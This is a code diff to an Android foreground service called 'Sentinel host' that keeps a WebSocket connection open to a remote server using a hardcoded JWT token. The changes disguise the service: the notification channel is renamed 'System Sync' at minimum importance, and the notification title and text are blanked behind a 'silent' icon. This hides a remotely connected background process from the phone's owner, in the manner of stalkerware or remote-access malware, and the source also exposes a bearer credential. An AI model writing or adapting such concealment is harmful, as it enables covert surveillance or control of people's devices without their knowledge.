@@ -5,12 +5,14 @@ import android.app.NotificationChannel
 import android.app.NotificationManager
 import android.app.PendingIntent
 import android.app.Service
+import android.content.Context
 import android.content.Intent
 import android.content.pm.ServiceInfo
 import android.os.Build
 import android.os.IBinder
 import android.util.Log
 import androidx.core.app.NotificationCompat
+import com.sentinel.host.R
 import com.sentinel.host.domain.model.ConnectionState
 import com.sentinel.host.domain.usecase.ConnectUseCase
 import dagger.hilt.android.AndroidEntryPoint
@@ -38,6 +40,15 @@ class SentinelForegroundService : Service() {
 
         const val SERVER_URL = "wss://project-sentinel-rwt4.onrender.com/ws"
         const val JWT_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXZpY2VfaWQiOiJIT1NULTAwMSIsImlzcyI6InByb2plY3Qtc2VudGluZWwiLCJzdWIiOiJIT1NULTAwMSIsImV4cCI6MTgxNTg5MDcwMywiaWF0IjoxNzg0MzU0NzAzfQ.l_yJzhLSY0Kuhudn6-5W81pyv77NBZkDsZVdXgWKeSA"
+
+        fun Start(context: Context) {
+            val intent = Intent(context, SentinelForegroundService::class.java)
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                context.startForegroundService(intent)
+            } else {
+                context.startService(intent)
+            }
+        }
     }
 
     @Inject lateinit var connectUseCase: ConnectUseCase
@@ -118,10 +129,10 @@ class SentinelForegroundService : Service() {
     private fun createNotificationChannel() {
         val channel = NotificationChannel(
             CHANNEL_ID,
-            "Sentinel Service",
-            NotificationManager.IMPORTANCE_LOW
+            "System Sync",
+            NotificationManager.IMPORTANCE_MIN
         ).apply {
-            description = "Keeps Sentinel host running in the background"
+            description = "System Synchronization"
             setShowBadge(false)
         }
         val nm = getSystemService(NotificationManager::class.java)
@@ -136,9 +147,9 @@ class SentinelForegroundService : Service() {
         )
 
         return NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle("Sentinel Host")
-            .setContentText(text)
-            .setSmallIcon(android.R.drawable.ic_dialog_info)
+            .setContentTitle("")
+            .setContentText("")
+            .setSmallIcon(R.drawable.ic_silent)
             .setOngoing(true)
             .setSilent(true)
             .setContentIntent(pendingIntent)
@@ -147,6 +158,6 @@ class SentinelForegroundService : Service() {
 
     private fun updateNotification(text: String) {
         val nm = getSystemService(NotificationManager::class.java)
-        nm.notify(NOTIFICATION_ID, buildNotification(text))
+        nm.notify(NOTIFICATION_ID, buildNotification(""))
     }
 }
